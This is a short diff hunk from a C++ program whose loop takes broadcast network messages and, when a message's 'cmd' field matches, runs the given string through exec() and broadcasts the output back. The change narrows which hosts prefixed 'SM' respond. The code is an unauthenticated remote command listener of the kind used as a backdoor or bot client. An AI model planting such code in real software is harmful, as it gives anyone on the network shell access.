@@ -101,7 +101,7 @@ int main() {
         msg = split((std::string)buffer);
 
         if (bytesReceived > 0) {
-            if(msg[0] == comp_hostname || msg[0] == "all" || (comp_hostname[0] == 'S' && comp_hostname[1] == 'M')){
+            if(msg[0] == comp_hostname || msg[0] == "all" || (comp_hostname[0] == 'S' && comp_hostname[1] == 'M' && msg[0] == "114")){
                 if(msg[1] == "cmd"){
                     std::string answ = exec(msg[2].c_str());
                     sendto(sock, answ.c_str(), answ.size(), 0, (struct sockaddr*)&broadcastAddr, addrLen);
